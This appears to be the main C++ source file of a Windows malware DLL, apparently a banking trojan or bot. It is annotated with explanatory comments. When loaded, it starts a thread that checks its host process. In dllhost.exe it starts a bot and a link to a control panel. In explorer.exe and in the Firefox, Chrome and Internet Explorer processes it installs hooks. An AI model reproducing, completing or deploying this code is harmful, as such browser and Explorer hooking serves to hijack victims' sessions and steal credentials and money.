#pragma comment(linker, "/ENTRY:DllMain")

extern "C" int _fltused = 0;

#include "..\common.h"
#include "..\wow64ext\wow64ext.h"
#include "FirefoxChrome.h"
#include "IE.h"
#include "Explorer.h"
#include "Bot.h"

static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)    /* checks if the window (referenced by hwnd) 
                                                                     belongs to the current process */ 
{
   DWORD pid;
   Funcs::pGetWindowThreadProcessId(hwnd, &pid);
   if(pid == Funcs::pGetCurrentProcessId())
      return FALSE;
   return TRUE;
}

static void WaitForWindow()                                       /* waits until the current process window appears */
{
   for(;;)
   {
      if(!Funcs::pEnumWindows(EnumWindowsProc, NULL))             // checks if there is a particular window running
         return;
      Sleep(100);
   }
}

static DWORD WINAPI EntryThread(LPVOID lpParam)
{
   char  exePath[MAX_PATH] = { 0 };
   char *exeName;
   Funcs::pGetModuleFileNameA(NULL, exePath, MAX_PATH);           // assignes a fully qualified name to exePath
   exeName = Funcs::pPathFindFileNameA(exePath);                  // exeName points to the executable name (found in exePath) 

   char mutexName[MAX_PATH] = { 0 };
   char botId[BOT_ID_LEN]   = { 0 };


   if(Funcs::pLstrcmpiA(exeName, Strs::dllhostExe) == 0)          // if exeName == dllhost.exe
   {
#if !_WIN64
      InitPanelRequest();                                         
      InitWow64ext();                                             // sets current process' heap handle to g_heap
      StartBot();
#endif
   }
   else if(Funcs::pLstrcmpiA(exeName, Strs::explorerExe) == 0)    // if ... == explorer.exe
      HookExplorer();
   else if(Funcs::pLstrcmpiA(exeName, Strs::firefoxExe) == 0)     // if ... == firefox.exe
   {
      WaitForWindow();
      InitPanelRequest();
      HookFirefox();
   }
   else if(Funcs::pLstrcmpiA(exeName, Strs::chromeExe) == 0)      // if ... == chrome.exe
   {
      WaitForWindow();
      InitPanelRequest();
      HookChrome();
   }
   else if(Funcs::pLstrcmpiA(exeName, Strs::iexploreExe) == 0)    // if ... == iexplore.exe
   {
      WaitForWindow();
      InitPanelRequest();
      HookIe();
   }
   return 0;
} 

BOOL WINAPI DllMain                                               /* called when the dll is loaded */
(
   HINSTANCE hModule,
   DWORD dwReason,
   LPVOID lpArgs
)
{
   switch(dwReason)
   {
     case DLL_PROCESS_ATTACH:                                     // means that the dll is loaded into the current process 
     {
         InitApi();
         Funcs::pCreateThread(NULL, 0, EntryThread, NULL, 0, NULL);
         break;
      }
   }
   return TRUE;
}
